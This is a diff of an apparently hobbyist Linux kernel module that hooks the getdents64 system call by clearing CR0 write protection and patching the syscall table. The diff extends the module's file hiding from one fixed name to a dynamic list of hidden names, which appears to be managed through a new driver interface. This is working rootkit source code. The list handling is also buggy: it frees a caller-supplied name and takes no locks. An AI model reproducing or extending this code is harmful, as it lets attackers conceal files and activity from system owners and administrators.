@@ -8,9 +8,8 @@
 #include <linux/uaccess.h>  /* copy_from_user, copy_to_user */
 #include <linux/string.h>   /* strcmp */
 
-/* Macros */
-#define FILE_TO_HIDE "hideme"
-#define MAX_DIRENT_NAME_LEN 256
+#include "idanm.h"  /* MAX_DIRENT_NAME_LEN, __force_order, orig_getdents64, sys_call_table_ptr, getdents64_t, getdents64_regs_t */
+#include "driver.h" /* init_driver, cleanup_driver */
 
 /* Module information */
 MODULE_LICENSE("GPL");
@@ -26,6 +25,7 @@ typedef asmlinkage int (*getdents64_regs_t)(const struct pt_regs *regs);
 /* Global variables */
 extern unsigned long __force_order;
 static asmlinkage getdents64_t orig_getdents64;
+struct linked_node *dir_list = NULL, *dir_list_tail = NULL;
 
 struct filtered_dirent
 {
@@ -49,7 +49,82 @@ static inline void one_wp(void)
     write_forced_cr0(read_cr0() | X86_CR0_WP);
 }
 
-static struct filtered_dirent filter_file_from_getdents(char __user *buffer, unsigned int bytes, const char *filter) // the bytes is the size of the buffer
+void add_file_to_hide(const char *name)
+{
+    struct linked_node *node;
+    char *new_name;
+
+    node = kmalloc(sizeof(struct linked_node), GFP_KERNEL);
+    if (!node)
+    {
+        pr_err("Idan's module failed to allocate memory for a new node");
+        return;
+    }
+    new_name = kmalloc(strlen(name) + 1, GFP_KERNEL); // +1 for the null-terminator
+    if (!new_name)
+    {
+        pr_err("Idan's module failed to allocate memory for a new name");
+        kfree(node);
+        return;
+    }
+
+    strcpy(new_name, name);
+    kfree(name);
+    node->name = new_name;
+    node->next = NULL;
+
+    if (!dir_list)
+    {
+        dir_list = node;
+    }
+    else
+    {
+        dir_list_tail->next = node;
+    }
+
+    dir_list_tail = node;
+
+    return;
+}
+
+void remove_file_from_list(const char *name)
+{
+    struct linked_node *node = dir_list, *prev = NULL;
+    while (!!node)
+    {
+        if (!strcmp(node->name, name))
+        {
+            if (prev)
+            {
+                prev->next = node->next;
+            }
+            else
+            {
+                dir_list = node->next;
+            }
+            kfree(node->name);
+            kfree(node);
+            return;
+        }
+        prev = node;
+        node = node->next;
+    }
+
+    return;
+}
+
+static int is_file_in_list(const char *name)
+{
+    struct linked_node *node;
+    for (node = dir_list; node; node = node->next)
+    {
+        if (strcmp(node->name, name) == 0)
+            return 1;
+    }
+    return 0;
+}
+
+static struct filtered_dirent filter_file_from_getdents(char __user *buffer, unsigned int bytes) // the bytes is the size of the buffer
 {
     char *kbuffer = (char *)kmalloc(bytes, GFP_KERNEL);
     char *filtered_buffer = (char *)kmalloc(bytes, GFP_KERNEL);
@@ -91,7 +166,7 @@ static struct filtered_dirent filter_file_from_getdents(char __user *buffer, uns
             fid.buffer = NULL;
             return fid;
         }
-        if (strcmp(dp->d_name, filter) != 0)
+        if (!is_file_in_list(dp->d_name))
         {
             memmove((filtered_buffer + fid.size), (char *)dp, dp->d_reclen);
 
@@ -114,7 +189,7 @@ static asmlinkage int modified_getdents64(const struct pt_regs *regs)
     if (bytes <= 0)
         return bytes; // error or empty
 
-    fid = filter_file_from_getdents((char *)dirent, bytes, FILE_TO_HIDE);
+    fid = filter_file_from_getdents((char *)dirent, bytes);
     if (fid.buffer)
     {
         if (fid.size != 0 && copy_to_user(dirent, fid.buffer, fid.size) != 0)
@@ -162,6 +237,13 @@ static int __init lkm_example_init(void)
     zero_wp();
     sys_call_table[__NR_getdents64] = (sys_call_ptr_t)modified_getdents64;
     one_wp();
+
+    if (init_driver() != 0)
+    {
+        pr_err("Coudln't initialize the driver");
+        EXIT_CODE = 2;
+    }
+
     pr_info("Idan's kernel successfully overridden the getdents64 function!!");
 
     goto cleanup;
